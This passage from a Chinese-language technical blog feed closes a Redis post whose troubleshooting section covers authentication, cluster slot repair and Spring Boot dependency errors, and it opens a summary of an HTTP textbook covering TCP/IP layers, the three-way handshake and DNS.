<li>Proxy &#x96C6;&#x7FA4;&#x4EE3;&#x7406;&#x6A21;&#x5F0F;&#x8BA9; Cluster &#x62E5;&#x6709;&#x50CF;&#x5355;&#x5B9E;&#x4F8B;&#x4E00;&#x6837;&#x7684;&#x63A5;&#x5165;&#x65B9;&#x5F0F;&#xFF0C;&#x964D;&#x4F4E;&#x4F7F;&#x7528; cluster &#x7684;&#x95E8;&#x69DB;&#x3002;&#x4E0D;&#x8FC7;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#x4EE3;&#x7406;&#x4E0D;&#x6539;&#x53D8; Cluster &#x7684;&#x529F;&#x80FD;&#x9650;&#x5236;&#xFF0C;&#x4E0D;&#x652F;&#x6301;&#x7684;&#x547D;&#x4EE4;&#x8FD8;&#x662F;&#x4E0D;&#x4F1A;&#x652F;&#x6301;&#xFF0C;&#x6BD4;&#x5982;&#x8DE8; slot &#x7684;&#x591A;&#x952E;&#x64CD;&#x4F5C;</li>
<li>Modules API &#x4F7F; Redis &#x53EF;&#x4EE5;&#x53D8;&#x6210;&#x4E00;&#x4E2A;&#x6846;&#x67B6;&#xFF0C;&#x5229;&#x7528; Modules &#x6765;&#x6784;&#x5EFA;&#x4E0D;&#x540C;&#x7CFB;&#x7EDF;</li>
</ul>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="bugs-%E8%A7%A3%E5%86%B3">Bugs &#x89E3;&#x51B3;</h2>
<ul>
<li>NOAUTH Authentication required.</li>
</ul>
<pre><code class="language-java">redis.clients.jedis.exceptions.JedisDataException: NOAUTH Authentication required.
</code></pre>
<p>SSM &#x6846;&#x67B6;&#x914D;&#x7F6E; redis &#x7684; Jedis &#x76F8;&#x5173; xml &#x914D;&#x7F6E;&#x540E;&#xFF0C;&#x8FDB;&#x884C;&#x5199;&#x5165;&#x6D4B;&#x8BD5;&#xFF0C;&#x51FA;&#x73B0;&#x6570;&#x636E;&#x5F02;&#x5E38;&#x3002;&#x539F;&#x56E0;&#x5728;&#x4E8E;&#x672A;&#x5BF9; redis &#x8FDB;&#x884C;&#x6388;&#x6743;&#x3002;</p>
<pre><code class="language-xml">&lt;!-- application.xml --&gt;
&lt;bean id=&quot;jedisPool&quot; class=&quot;redis.clients.jedis.JedisPool&quot;&gt;
    &lt;constructor-arg name=&quot;user&quot; value=&quot;xxx&quot;&gt;&lt;/constructor-arg&gt;
    &lt;constructor-arg name=&quot;password&quot; value=&quot;xxx&quot;&gt;&lt;/constructor-arg&gt;
    &lt;property name=&quot;...&quot; value=&quot;...&quot; /&gt;
&lt;/bean&gt;
</code></pre>
<ul>
<li>[ERR] Node REMOTEIP:PORT is not empty. Either the node already knows other nodes (check with CLUSTER NODES) or contains some key in database 0.</li>
</ul>
<p>&#x5F02;&#x5E38;&#x7684;&#x8282;&#x70B9;&#x53EF;&#x80FD;&#x4E0E;&#x5176;&#x4ED6;&#x8282;&#x70B9;&#x7EC4;&#x6210;&#x8FC7;&#x96C6;&#x7FA4;&#xFF0C;&#x6216;&#x8005;&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x5305;&#x542B;&#x4E00;&#x4E9B;&#x6570;&#x636E;&#x3002;</p>
<p>&#x9996;&#x5148;&#x5E94;&#x505C;&#x6B62;&#x670D;&#x52A1;&#xFF0C;&#x82E5;&#x4E0D;&#x505C;&#x6B62;&#x670D;&#x52A1;&#x76F4;&#x63A5;&#x5220;&#x9664;&#x6587;&#x4EF6;&#x53EF;&#x80FD;&#x65E0;&#x6548;&#xFF1B;&#x5728;&#x5220;&#x9664;&#x751F;&#x6210;&#x7684;&#x5907;&#x4EFD; aof&#x3001;rdb&#x3001;nodes.conf &#x6587;&#x4EF6;&#x540E;&#x91CD;&#x542F;&#x670D;&#x52A1;&#xFF1B;&#x5728;&#x5FC5;&#x8981;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x4E5F;&#x53EF;&#x4EE5;&#x6267;&#x884C; <code>flushdb</code>&#x3002;</p>
<ul>
<li>[ERR] Not all 16384 slots are covered by nodes.</li>
</ul>
<p>&#x8FD9;&#x4E2A;&#x5F80;&#x5F80;&#x662F;&#x7531;&#x4E8E;&#x4E3B; node &#x79FB;&#x9664;&#xFF0C;&#x4F46;&#x5E76;&#x6CA1;&#x6709;&#x79FB;&#x9664; node &#x4E0A;&#x9762;&#x7684; slot&#xFF0C;&#x4ECE;&#x800C;&#x5BFC;&#x81F4; slot &#x603B;&#x6570;&#x6CA1;&#x6709;&#x8FBE;&#x5230; 16384&#xFF0C;&#x5BFC;&#x81F4; slots &#x5206;&#x5E03;&#x4E0D;&#x6B63;&#x786E;&#x3002;&#x5728;&#x5220;&#x9664;&#x8282;&#x70B9;&#x7684;&#x65F6;&#x5019;&#x4E00;&#x5B9A;&#x8981;&#x6CE8;&#x610F;&#x5220;&#x9664;&#x7684;&#x662F;&#x5426;&#x662F; Master &#x4E3B;&#x8282;&#x70B9;&#x3002;</p>
<pre><code class="language-shell"># redis-cli --cluster fix host:port =&gt; &#x4FEE;&#x590D;&#x96C6;&#x7FA4;
[centos myredis]# redis-cli --cluster fix 127.0.0.1:6379 
# redis-cli --cluster check host:port =&gt; &#x68C0;&#x67E5;
[centos myredis]# redis-cli --cluster check 127.0.0.1:6379
# redis-cli --cluster reshar host:port =&gt; &#x91CD;&#x65B0;&#x5206;&#x914D; slot
[centos myredis]# redis-cli --cluster reshard 127.0.0.1:6379
127.0.0.1:6379&gt; cluster nodes # &#x67E5;&#x770B;&#x8282;&#x70B9;&#x4E2D;&#x96C6;&#x7FA4;&#x4FE1;&#x606F;
</code></pre>
<ul>
<li>com.fasterxml.jackson.databind.ObjectMapper? &#x2325;&#x23CE;</li>
</ul>
<p>springboot &#x6574;&#x5408; redis &#x51FA;&#x73B0; ObjectMapper &#x627E;&#x4E0D;&#x5230;&#x76F8;&#x5173;&#x5305;&#x7684;&#x95EE;&#x9898;&#x3002;<a href="https://stackoverflow.com/questions/34290913/objectmapper-cannot-be-resolved-to-a-type">SOF</a>&#x3002;</p>
<blockquote>
<p>Data Binding API is used to convert JSON to and from POJO (Plain Old Java Object) using property accessor or using annotations. It is of two type. Simple Data Binding - Converts JSON to and from Java Maps, Lists, Strings, Numbers, Booleans and null objects.</p>
</blockquote>
<pre><code class="language-java">// &#x95EE;&#x9898;&#x4EE3;&#x7801;
ObjectMapper om = new ObjectMapper();
</code></pre>
<pre><code class="language-xml">&lt;dependency&gt;
    &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;
    &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt;
    &lt;version&gt;2.13.3&lt;/version&gt;
&lt;/dependency&gt;
&lt;dependency&gt;
    &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;
    &lt;artifactId&gt;jackson-core&lt;/artifactId&gt;
    &lt;version&gt;2.13.3&lt;/version&gt;
&lt;/dependency&gt;
</code></pre>
<ul>
<li>Cannot Resolve Symbol RestController</li>
</ul>
<p>&#x5728; pom.xml &#x4E2D;&#x52A0;&#x5165; spring-boot-starter-web &#x7684;&#x4F9D;&#x8D56;&#x3002;&#x5E38;&#x89C1;&#x4E8E;&#x521B;&#x5EFA; springboot &#x9879;&#x76EE;&#x65F6;&#x672A;&#x9009;&#x62E9; web &#x76F8;&#x5173; starter&#xFF0C;&#x4E5F;&#x4F1A;&#x5BFC;&#x81F4;&#x542F;&#x52A8;&#x65F6;&#x4E0D;&#x8F7D;&#x5165; web&#x3002;</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E7%BB%93%E6%9D%9F">&#x7ED3;&#x675F;</h2>
<p>&#x672C;&#x535A;&#x5BA2;&#x6240;&#x6709;&#x6587;&#x7AE0;&#x9664;&#x7279;&#x522B;&#x58F0;&#x660E;&#x5916;&#xFF0C;&#x5747;&#x91C7;&#x7528;<a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh"> CC BY-SA 4.0 </a>&#x534F;&#x8BAE;&#xFF0C;&#x8F6C;&#x8F7D;&#x8BF7;&#x6CE8;&#x660E;&#x51FA;&#x5904;&#xFF01;</p>
<!--kg-card-end: markdown-->]]></content:encoded></item><item><title><![CDATA[图解 HTTP 摘要]]></title><description><![CDATA[据 [日] 上野宣 HTTPの教科書 的部分总结于摘要。]]></description><link>yourdomain.com/httptextbook/</link><guid isPermaLink="false">6264efa3aa2820757fbb1478</guid><category><![CDATA[Technology growth]]></category><dc:creator><![CDATA[Ziyi Xie]]></dc:creator><pubDate>Mon, 09 Aug 2021 13:09:00 GMT</pubDate><media:content url="yourdomain.com/content/images/2022/04/http-https.png" medium="image"/><content:encoded><![CDATA[<!--kg-card-begin: markdown--><h2 id="web-%E5%8F%8A%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80">Web &#x53CA;&#x7F51;&#x7EDC;&#x57FA;&#x7840;</h2>
<img src="yourdomain.com/content/images/2022/04/http-https.png" alt="&#x56FE;&#x89E3; HTTP &#x6458;&#x8981;"><p>&#x901A;&#x8FC7;&#x53D1;&#x9001;&#x8BF7;&#x6C42;&#x83B7;&#x53D6;&#x670D;&#x52A1;&#x5668;&#x8D44;&#x6E90;&#x7684; Web &#x6D4F;&#x89C8;&#x5668;&#x7B49;&#xFF0C;&#x90FD;&#x53EF;&#x79F0;&#x4E3A; client &#x5BA2;&#x6237;&#x7AEF;&#x3002;Web &#x4F7F;&#x7528;&#x4E00;&#x79CD;&#x540D;&#x4E3A;&#x8D85;&#x6587;&#x672C;&#x4F20;&#x8F93;&#x534F;&#x8BAE; HyperText Transfer Protocol &#x4F5C;&#x4E3A;&#x89C4;&#x8303;&#xFF0C;&#x5B8C;&#x6210;&#x4ECE;&#x5BA2;&#x6237;&#x7AEF;&#x5230;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x7B49;&#x4E00;&#x7CFB;&#x5217;&#x8FD0;&#x4F5C;&#x6D41;&#x7A0B;&#x3002;&#x800C;&#x534F;&#x8BAE;&#x662F;&#x6307;&#x89C4;&#x5219;&#x7684;&#x7EA6;&#x5B9A;&#x3002;&#x53EF;&#x4EE5;&#x8BF4;&#xFF0C;Web &#x662F;&#x5EFA;&#x7ACB;&#x5728; HTTP &#x534F;&#x8BAE;&#x4E0A;&#x901A;&#x4FE1;&#x7684;&#x3002;</p>
<p>&#x901A;&#x5E38;&#x4F7F;&#x7528;&#x7684;&#x7F51;&#x7EDC;&#xFF08;&#x5305;&#x62EC;&#x4E92;&#x8054;&#x7F51;&#xFF09;&#x662F;&#x5728; TCP/IP &#x534F;&#x8BAE;&#x65CF;&#x7684;&#x57FA;&#x7840;&#x4E0A;&#x8FD0;&#x4F5C;&#x7684;&#x3002;&#x800C; HTTP &#x5C5E;&#x4E8E;&#x5B83;&#x5185;&#x90E8;&#x7684;&#x4E00;&#x4E2A;&#x5B50;&#x96C6;&#x3002;TCP/IP &#x534F;&#x8BAE;&#x65CF;&#x91CC;&#x91CD;&#x8981;&#x7684;&#x4E00;&#x70B9;&#x5C31;&#x662F;&#x5206;&#x5C42;&#x3002;TCP/IP &#x534F;&#x8BAE;&#x65CF;&#x6309;&#x5C42;&#x6B21;&#x5206;&#x522B;&#x5206;&#x4E3A;&#x4EE5;&#x4E0B;4&#x5C42;&#xFF1A;&#x5E94;&#x7528;&#x5C42;&#x3001;&#x4F20;&#x8F93;&#x5C42;&#x3001;&#x7F51;&#x7EDC;&#x5C42;&#x548C;&#x94FE;&#x8DEF;&#x5C42;&#x3002;</p>
<ul>
<li>&#x5E94;&#x7528;&#x5C42;&#x51B3;&#x5B9A;&#x4E86;&#x5411;&#x7528;&#x6237;&#x63D0;&#x4F9B;&#x5E94;&#x7528;&#x670D;&#x52A1;&#x65F6;&#x901A;&#x4FE1;&#x7684;&#x6D3B;&#x52A8;&#x3002;TCP/IP &#x534F;&#x8BAE;&#x65CF;&#x5185;&#x9884;&#x5B58;&#x4E86;&#x5404;&#x7C7B;&#x901A;&#x7528;&#x7684;&#x5E94;&#x7528;&#x670D;&#x52A1;&#x3002;&#x6BD4;&#x5982;&#xFF0C;FTP&#xFF08;File Transfer Protocol&#xFF0C;&#x6587;&#x4EF6;&#x4F20;&#x8F93;&#x534F;&#x8BAE;&#xFF09;&#x548C;DNS&#xFF08;Domain Name System&#xFF0C;&#x57DF;&#x540D;&#x7CFB;&#x7EDF;&#xFF09;&#x670D;&#x52A1;&#x5C31;&#x662F;&#x5176;&#x4E2D;&#x4E24;&#x7C7B;&#x3002;HTTP &#x534F;&#x8BAE;&#x4E5F;&#x5904;&#x4E8E;&#x8BE5;&#x5C42;&#x3002;</li>
<li>&#x4F20;&#x8F93;&#x5C42;&#x5BF9;&#x4E0A;&#x5C42;&#x5E94;&#x7528;&#x5C42;&#xFF0C;&#x63D0;&#x4F9B;&#x5904;&#x4E8E;&#x7F51;&#x7EDC;&#x8FDE;&#x63A5;&#x4E2D;&#x7684;&#x4E24;&#x53F0;&#x8BA1;&#x7B97;&#x673A;&#x4E4B;&#x95F4;&#x7684;&#x6570;&#x636E;&#x4F20;&#x8F93;&#x3002;&#x5728;&#x4F20;&#x8F93;&#x5C42;&#x6709;&#x4E24;&#x4E2A;&#x6027;&#x8D28;&#x4E0D;&#x540C;&#x7684;&#x534F;&#x8BAE;&#xFF1A;TCP&#xFF08;Transmission Control Protocol&#xFF0C;&#x4F20;&#x8F93;&#x63A7;&#x5236;&#x534F;&#x8BAE;&#xFF09;&#x548C;UDP&#xFF08;User Data Protocol&#xFF0C;&#x7528;&#x6237;&#x6570;&#x636E;&#x62A5;&#x534F;&#x8BAE;&#xFF09;&#x3002;</li>
<li>&#x7F51;&#x7EDC;&#x5C42;&#x7528;&#x6765;&#x5904;&#x7406;&#x5728;&#x7F51;&#x7EDC;&#x4E0A;&#x6D41;&#x52A8;&#x7684;&#x6570;&#x636E;&#x5305;&#x3002;&#x6570;&#x636E;&#x5305;&#x662F;&#x7F51;&#x7EDC;&#x4F20;&#x8F93;&#x7684;&#x6700;&#x5C0F;&#x6570;&#x636E;&#x5355;&#x4F4D;&#x3002;&#x8BE5;&#x5C42;&#x89C4;&#x5B9A;&#x4E86;&#x901A;&#x8FC7;&#x600E;&#x6837;&#x7684;&#x8DEF;&#x5F84;&#xFF08;&#x6240;&#x8C13;&#x7684;&#x4F20;&#x8F93;&#x8DEF;&#x7EBF;&#xFF09;&#x5230;&#x8FBE;&#x5BF9;&#x65B9;&#x8BA1;&#x7B97;&#x673A;&#xFF0C;&#x5E76;&#x628A;&#x6570;&#x636E;&#x5305;&#x4F20;&#x9001;&#x7ED9;&#x5BF9;&#x65B9;&#x3002;&#x4E0E;&#x5BF9;&#x65B9;&#x8BA1;&#x7B97;&#x673A;&#x4E4B;&#x95F4;&#x901A;&#x8FC7;&#x591A;&#x53F0;&#x8BA1;&#x7B97;&#x673A;&#x6216;&#x7F51;&#x7EDC;&#x8BBE;&#x5907;&#x8FDB;&#x884C;&#x4F20;&#x8F93;&#x65F6;&#xFF0C;&#x7F51;&#x7EDC;&#x5C42;&#x6240;&#x8D77;&#x7684;&#x4F5C;&#x7528;&#x5C31;&#x662F;&#x5728;&#x4F17;&#x591A;&#x7684;&#x9009;&#x9879;&#x5185;&#x9009;&#x62E9;&#x4E00;&#x6761;&#x4F20;&#x8F93;&#x8DEF;&#x7EBF;&#x3002;</li>
<li>&#x94FE;&#x8DEF;&#x5C42;&#x7528;&#x6765;&#x5904;&#x7406;&#x8FDE;&#x63A5;&#x7F51;&#x7EDC;&#x7684;&#x786C;&#x4EF6;&#x90E8;&#x5206;&#x3002;&#x5305;&#x62EC;&#x63A7;&#x5236;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x3001;&#x786C;&#x4EF6;&#x7684;&#x8BBE;&#x5907;&#x9A71;&#x52A8;&#x3001;&#x7F51;&#x7EDC;&#x9002;&#x914D;&#x5668;&#xFF0C;&#x5373;&#x7F51;&#x5361; Network Interface Card&#xFF0C;&#x53CA;&#x5149;&#x7EA4;&#x7B49;&#x7269;&#x7406;&#x53EF;&#x89C1;&#x90E8;&#x5206;&#xFF08;&#x8FD8;&#x5305;&#x62EC;&#x8FDE;&#x63A5;&#x5668;&#x7B49;&#x4E00;&#x5207;&#x4F20;&#x8F93;&#x5A92;&#x4ECB;&#xFF09;&#x3002;</li>
</ul>
<h3 id="osi-%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B">OSI &#x4E03;&#x5C42;&#x6A21;&#x578B;</h3>
<p>OSI &#x6A21;&#x578B;&#x662F;&#x56FD;&#x9645;&#x5316;&#x7EC4;&#x7EC7;(ISO)&#x63D0;&#x51FA;&#x7684;&#x4E16;&#x754C;&#x8303;&#x56F4;&#x8BA1;&#x7B97;&#x673A;&#x4E92;&#x8054;&#x6846;&#x67B6;&#x3002;OSI &#x4E03;&#x5C42;&#x6A21;&#x578B;&#x5404;&#x81EA;&#x5B9E;&#x73B0;&#x529F;&#x80FD;&#x4E0E;&#x534F;&#x8BAE;&#xFF0C;&#x5E76;&#x4E0E;&#x76F8;&#x90BB;&#x5C42;&#x63A5;&#x53E3;&#x901A;&#x4FE1;&#x3002;</p>
<pre><code class="language-zsh"># &quot;&#x7269;&#x8054;&#x7F51;&#x6DD1;&#x60E0;&#x8BD5;&#x7528;&quot;
&#x5E94;&#x7528;&#x5C42; =&gt; &#x8868;&#x793A;&#x5C42; =&gt; &#x4F1A;&#x8BDD;&#x5C42; =&gt; &#x4F20;&#x8F93;&#x5C42; =&gt; &#x7F51;&#x7EDC;&#x5C42; =&gt; &#x6570;&#x636E;&#x94FE;&#x8DEF;&#x5C42; =&gt; &#x7269;&#x7406;&#x5C42;
</code></pre>
<h3 id="%E4%B8%8Ehttp%E5%85%B3%E7%B3%BB%E5%AF%86%E5%88%87%E7%9A%84%E5%8D%8F%E8%AE%AE%EF%BC%9Aip%E3%80%81tcp%E5%92%8Cdns">&#x4E0E;HTTP&#x5173;&#x7CFB;&#x5BC6;&#x5207;&#x7684;&#x534F;&#x8BAE;&#xFF1A;IP&#x3001;TCP&#x548C;DNS</h3>
<ul>
<li>&#x8D1F;&#x8D23;&#x4F20;&#x8F93;&#x7684;IP&#x534F;&#x8BAE;</li>
</ul>
<p>IP&#xFF08;Internet Protocol&#xFF09;&#x7F51;&#x9645;&#x534F;&#x8BAE;&#x4F4D;&#x4E8E;&#x7F51;&#x7EDC;&#x5C42;&#x3002;Internet Protocol &#x8FD9;&#x4E2A;&#x540D;&#x79F0;&#x53EF;&#x80FD;&#x542C;&#x8D77;&#x6765;&#x6709;&#x70B9;&#x5938;&#x5F20;&#xFF0C;&#x4F46;&#x4E8B;&#x5B9E;&#x6B63;&#x662F;&#x5982;&#x6B64;&#xFF0C;&#x56E0;&#x4E3A;&#x51E0;&#x4E4E;&#x6240;&#x6709;&#x4F7F;&#x7528;&#x7F51;&#x7EDC;&#x7684;&#x7CFB;&#x7EDF;&#x90FD;&#x4F1A;&#x7528;&#x5230; IP &#x534F;&#x8BAE;&#x3002;TCP/IP &#x534F;&#x8BAE;&#x65CF;&#x4E2D;&#x7684; IP &#x6307;&#x7684;&#x5C31;&#x662F;&#x7F51;&#x9645;&#x534F;&#x8BAE;&#xFF0C;&#x534F;&#x8BAE;&#x540D;&#x79F0;&#x4E2D;&#x5360;&#x636E;&#x4E86;&#x4E00;&#x534A;&#x4F4D;&#x7F6E;&#xFF0C;&#x5176;&#x91CD;&#x8981;&#x6027;&#x53EF;&#x89C1;&#x4E00;&#x6591;&#x3002;&#x53EF;&#x80FD;&#x6709;&#x4EBA;&#x4F1A;&#x628A; &quot;IP&quot; &#x548C; &quot;IP&#x5730;&#x5740;&quot; &#x641E;&#x6DF7;&#xFF0C;&quot;IP&quot; &#x5176;&#x5B9E;&#x662F;&#x4E00;&#x79CD;&#x534F;&#x8BAE;&#x7684;&#x540D;&#x79F0;&#x3002;<br>
IP &#x534F;&#x8BAE;&#x7684;&#x4F5C;&#x7528;&#x662F;&#x628A;&#x5404;&#x79CD;&#x6570;&#x636E;&#x5305;&#x4F20;&#x9001;&#x7ED9;&#x5BF9;&#x65B9;&#x3002;&#x800C;&#x8981;&#x4FDD;&#x8BC1;&#x786E;&#x5B9E;&#x4F20;&#x9001;&#x5230;&#x5BF9;&#x65B9;&#x90A3;&#x91CC;&#xFF0C;&#x5219;&#x9700;&#x8981;&#x6EE1;&#x8DB3;&#x5404;&#x7C7B;&#x6761;&#x4EF6;&#x3002;&#x5176;&#x4E2D;&#x4E24;&#x4E2A;&#x91CD;&#x8981;&#x7684;&#x6761;&#x4EF6;&#x662F; IP &#x5730;&#x5740;&#x548C; MAC &#x5730;&#x5740;&#xFF08;Media Access Control Address&#xFF09;&#x3002;<br>
<strong>IP &#x5730;&#x5740;&#x6307;&#x660E;&#x4E86;&#x8282;&#x70B9;&#x88AB;&#x5206;&#x914D;&#x5230;&#x7684;&#x5730;&#x5740;&#xFF0C;MAC&#x5730;&#x5740;&#x662F;&#x6307;&#x7F51;&#x5361;&#x6240;&#x5C5E;&#x7684;&#x56FA;&#x5B9A;&#x5730;&#x5740;&#x3002;</strong> IP &#x5730;&#x5740;&#x53EF;&#x4EE5;&#x548C; MAC &#x5730;&#x5740;&#x8FDB;&#x884C;&#x914D;&#x5BF9;&#x3002;IP&#x5730;&#x5740;&#x53EF;&#x53D8;&#x6362;&#xFF0C;&#x4F46; MAC &#x5730;&#x5740;&#x57FA;&#x672C;&#x4E0A;&#x4E0D;&#x4F1A;&#x66F4;&#x6539;&#x3002;</p>
<ul>
<li>&#x786E;&#x4FDD;&#x53EF;&#x9760;&#x6027;&#x7684;TCP&#x534F;&#x8BAE;</li>
</ul>
<p>&#x6309;&#x5C42;&#x6B21;&#x5206;&#xFF0C;TCP &#x4F4D;&#x4E8E;&#x4F20;&#x8F93;&#x5C42;&#xFF0C;&#x63D0;&#x4F9B;&#x53EF;&#x9760;&#x7684;&#x5B57;&#x8282;&#x6D41;&#x670D;&#x52A1;&#x3002;&#x6240;&#x8C13;&#x7684;&#x5B57;&#x8282;&#x6D41;&#x670D;&#x52A1;&#xFF08;Byte Stream Service&#xFF09;&#x662F;&#x6307;&#xFF0C;&#x4E3A;&#x4E86;&#x65B9;&#x4FBF;&#x4F20;&#x8F93;&#xFF0C;&#x5C06;&#x5927;&#x5757;&#x6570;&#x636E;&#x5206;&#x5272;&#x6210;&#x4EE5;&#x62A5;&#x6587;&#x6BB5;&#xFF08;segment&#xFF09;&#x4E3A;&#x5355;&#x4F4D;&#x7684;&#x6570;&#x636E;&#x5305;&#x8FDB;&#x884C;&#x7BA1;&#x7406;&#x3002;&#x4E00;&#x8A00;&#x4EE5;&#x853D;&#x4E4B;&#xFF0C;TCP&#x534F;&#x8BAE;&#x4E3A;&#x4E86;&#x66F4;&#x5BB9;&#x6613;&#x4F20;&#x9001;&#x5927;&#x6570;&#x636E;&#x624D;&#x628A;&#x6570;&#x636E;&#x5206;&#x5272;&#xFF0C;&#x800C;&#x4E14;TCP&#x534F;&#x8BAE;&#x80FD;&#x591F;&#x786E;&#x8BA4;&#x6570;&#x636E;&#x6700;&#x7EC8;&#x662F;&#x5426;&#x9001;&#x8FBE;&#x5230;&#x5BF9;&#x65B9;&#x3002;</p>
<p>&#x4E3A;&#x51C6;&#x786E;&#x65E0;&#x8BEF;&#x5730;&#x5C06;&#x6570;&#x636E;&#x9001;&#x8FBE;&#x76EE;&#x6807;&#x5904;&#xFF0C;TCP &#x534F;&#x8BAE;&#x91C7;&#x7528;&#x4E09;&#x6B21;&#x63E1;&#x624B; three-way handshaking &#x7B56;&#x7565;&#x3002;&#x7528; TCP &#x534F;&#x8BAE;&#x628A;&#x6570;&#x636E;&#x5305;&#x9001;&#x51FA;&#x53BB;&#x540E;&#xFF0C;TCP &#x4E0D;&#x4F1A;&#x5BF9;&#x4F20;&#x9001;&#x540E;&#x7684;&#x60C5;&#x51B5;&#x7F6E;&#x4E4B;&#x4E0D;&#x7406;&#xFF0C;&#x5176;&#x4E00;&#x5B9A;&#x4F1A;&#x5411;&#x5BF9;&#x65B9;&#x786E;&#x8BA4;&#x662F;&#x5426;&#x6210;&#x529F;&#x9001;&#x8FBE;&#x3002;&#x63E1;&#x624B;&#x8FC7;&#x7A0B;&#x4E2D;&#x4F7F;&#x7528;&#x4E86;TCP&#x7684;&#x6807;&#x5FD7;flag &#x2014;&#x2014; SYN synchronize &#x548C;ACK acknowledgement&#x3002;</p>
<p>&#x53D1;&#x9001;&#x7AEF;&#x9996;&#x5148;&#x53D1;&#x9001;&#x4E00;&#x4E2A;&#x5E26; SYN &#x6807;&#x5FD7;&#x7684;&#x6570;&#x636E;&#x5305;&#x7ED9;&#x5BF9;&#x65B9;&#x3002;&#x63A5;&#x6536;&#x7AEF;&#x6536;&#x5230;&#x540E;&#x56DE;&#x4F20;&#x4E00;&#x4E2A;&#x5E26;&#x6709; SYN/ACK &#x6807;&#x5FD7;&#x7684;&#x6570;&#x636E;&#x5305;&#x4EE5;&#x793A;&#x4F20;&#x8FBE;&#x786E;&#x8BA4;&#x4FE1;&#x606F;&#x3002;&#x6700;&#x540E;&#xFF0C;&#x53D1;&#x9001;&#x7AEF;&#x518D;&#x56DE;&#x4F20;&#x4E00;&#x4E2A;&#x5E26; ACK &#x6807;&#x5FD7;&#x7684;&#x6570;&#x636E;&#x5305;&#xFF0C;&#x4EE3;&#x8868;&quot;&#x63E1;&#x624B;&quot;&#x7ED3;&#x675F;&#x3002;&#x82E5;&#x5728;&#x63E1;&#x624B;&#x8FC7;&#x7A0B;&#x4E2D;&#x67D0;&#x4E2A;&#x9636;&#x6BB5;&#x83AB;&#x540D;&#x4E2D;&#x65AD;&#xFF0C;TCP &#x534F;&#x8BAE;&#x4F1A;&#x518D;&#x6B21;&#x4EE5;&#x76F8;&#x540C;&#x7684;&#x987A;&#x5E8F;&#x53D1;&#x9001;&#x76F8;&#x540C;&#x7684;&#x6570;&#x636E;&#x5305;&#x3002;</p>
<p><img src="https://www.zairesinatra.com/content/images/2021/12/three-way-handshaking.png" alt="&#x56FE;&#x89E3; HTTP &#x6458;&#x8981;" loading="lazy"></p>
<ul>
<li>&#x8D1F;&#x8D23;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x7684;DNS&#x670D;&#x52A1;</li>
</ul>
<p>DNS&#xFF08;Domain Name System&#xFF09;&#x670D;&#x52A1;&#x662F;&#x548C;HTTP&#x534F;&#x8BAE;&#x4E00;&#x6837;&#x4F4D;&#x4E8E;&#x5E94;&#x7528;&#x5C42;&#x7684;&#x534F;&#x8BAE;&#x3002;&#x5B83;&#x63D0;&#x4F9B;&#x57DF;&#x540D;&#x5230;IP&#x5730;&#x5740;&#x4E4B;&#x95F4;&#x7684;&#x89E3;&#x6790;&#x670D;&#x52A1;&#x3002;&#x8BA1;&#x7B97;&#x673A;&#x65E2;&#x53EF;&#x4EE5;&#x88AB;&#x8D4B;&#x4E88;IP&#x5730;&#x5740;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x88AB;&#x8D4B;&#x4E88;&#x4E3B;&#x673A;&#x540D;&#x548C;&#x57DF;&#x540D;&#x3002;&#x6BD4;&#x5982;www.hackr.jp&#x3002;<br>
&#x7528;&#x6237;&#x901A;&#x5E38;&#x4F7F;&#x7528;&#x4E3B;&#x673A;&#x540D;&#x6216;&#x57DF;&#x540D;&#x6765;&#x8BBF;&#x95EE;&#x5BF9;&#x65B9;&#x7684;&#x8BA1;&#x7B97;&#x673A;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x76F4;&#x63A5;&#x901A;&#x8FC7;IP&#x5730;&#x5740;&#x8BBF;&#x95EE;&#x3002;&#x56E0;&#x4E3A;&#x4E0E;IP&#x5730;&#x5740;&#x7684;&#x4E00;&#x7EC4;&#x7EAF;&#x6570;&#x5B57;&#x76F8;&#x6BD4;&#xFF0C;&#x7528;&#x5B57;&#x6BCD;&#x914D;&#x5408;&#x6570;&#x5B57;&#x7684;&#x8868;&#x793A;&#x5F62;&#x5F0F;&#x6765;&#x6307;&#x5B9A;&#x8BA1;&#x7B97;&#x673A;&#x540D;&#x66F4;&#x7B26;&#x5408;&#x4EBA;&#x7C7B;&#x7684;&#x8BB0;&#x5FC6;&#x4E60;&#x60EF;&#x3002;DNS&#x534F;&#x8BAE;&#x63D0;&#x4F9B;&#x901A;&#x8FC7;&#x57DF;&#x540D;&#x67E5;&#x627E;IP&#x5730;&#x5740;&#xFF0C;&#x6216;&#x9006;&#x5411;&#x4ECE;IP&#x5730;&#x5740;&#x53CD;&#x67E5;&#x57DF;&#x540D;&#x7684;&#x670D;&#x52A1;&#x3002;</p>
<h3 id="uri%E5%92%8Curl">URI&#x548C;URL</h3>
<p>URL&#x6B63;&#x662F;&#x4F7F;&#x7528;Web&#x6D4F;&#x89C8;&#x5668;&#x7B49;&#x8BBF;&#x95EE;Web&#x9875;&#x9762;&#x65F6;&#x9700;&#x8981;&#x8F93;&#x5165;&#x7684;&#x7F51;&#x9875;&#x5730;&#x5740;&#x3002;URI&#x662F;Uniform Resource 